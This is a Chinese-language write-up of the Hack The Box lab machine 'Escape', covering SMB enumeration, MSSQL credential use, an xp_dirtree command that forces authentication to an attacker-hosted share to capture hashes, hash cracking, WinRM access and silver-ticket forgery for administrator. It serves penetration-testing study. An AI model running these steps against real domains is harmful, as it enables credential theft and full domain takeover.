# Escape

Escape 是一台中等难度的 Windows Active Directory 计算机，它以 SMB 共享开始，经过来宾身份验证的用户可以下载敏感的 PDF 文件。在PDF文件中，临时凭据可用于访问计算机上运行的MSSQL服务。攻击者能够强制 MSSQL 服务向他的计算机进行身份验证并捕获哈希值。事实证明，该服务在用户帐户下运行，并且哈希值是可破解的。拥有一组有效的凭据，攻击者能够使用 WinRM 在计算机上执行命令。枚举计算机时，日志文件会显示用户“ryan.cooper”的凭据。进一步枚举计算机，显示存在证书颁发机构，并且一个证书模板容易受到 ESC1 攻击，这意味着可清晰地使用此模板的用户可以为域中的任何其他用户（包括域管理员）请求证书。因此，通过利用 ESC1 漏洞，攻击者能够获取管理员帐户的有效证书，然后使用它来获取管理员用户的哈希值。

---

## 外部信息收集

### 端口扫描

循例nmap

```shell
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-12-28 15:19:07Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

### SMB枚举

smbmap 看一下有个share可读

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e61d14c5-d16e-8dd8-fbbc-5a9af8ccbc70.png)

有一个pdf

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9b740c63-71a4-49b4-077a-4bd7b9d8ee19.png)

下下来

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/17ab703d-d478-92db-faf5-6e92b155439e.png)

里面给了一组凭据，它应该是用于mssql的

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/f90ed0eb-d653-76aa-e5d6-79219ee4efc8.png)

这组凭据我们能够使用mssqlclient

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/c507a6a6-fdd5-ad93-67e8-45440445f8bb.png)

无权执行xp_cmdshell

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/b4375441-623a-6c09-7c2f-d9d4b25f9eb3.png)

## Foothold

通过对攻击机托管的恶意smb服务发起身份认证来获取hash

	exec master.dbo.xp_dirtree "\\10.10.14.18\hack"

查看responder

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/0c0c6e05-5df4-bd27-52d0-d9ba1a0d765e.png)

hashcat直接爆

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/70f4c382-f357-42d9-903e-70b388dd9cf2.png)

尝试登evil-winrm

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/4acd71f5-2995-573d-6a5b-1c5daa2fca3d.png)

## 横向移动 -> Ryan.Cooper

在这里发现一个log

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/5974c76d-368d-e1fa-b58a-7569abef62f1.png)

在里面可以看到一个明文密码

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/45f6df37-81c0-b605-cf18-1b6c25046049.png)

登winrm成功

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8d84954e-ff01-3b08-e0a6-fb396f41c5f9.png)

## 权限提升

经典SeMachineAccountPrivilege

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/da2390b4-e79f-1662-a008-dd61789c8777.png)

我使用certipy发现了存在ESC1，ESC1打很多遍了，但是我看wp有更好玩的提权路线

现在我们直接伪造tgs（银票），因为前面我们已经拿到了sql_svc的明文密码了，那个是mssql服务账户

现在我们就可以为administrator伪造银票，常规操作

**注意，我们不要忽略了PAC的存在，我们当前是无法伪造PAC的，因为我们没有krbtgt hash，所以这里能打成功是因为mssql服务不去找KDC验证PAC吧**

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/8b76c69d-d13c-a996-597a-5ab4104b960c.png)

我们还需要设置ntpdate，否则我们将因为来自不受信任的域而登录失败

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/e9f9318e-f3a9-bff1-efa0-7e79b13a7d75.png)

设置KRB5CCNAME，然后登mssqlclient

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/9d76639b-5294-ba0b-ab26-8c3bc85e739c.png)

mssql模拟administrator，通过administrator的权限，我们可以读到root flag

![file](https://blog.apt250.zip/wp-content/uploads/2023/12/3b29905d-ec88-1045-38e8-38d951e0501d.png)
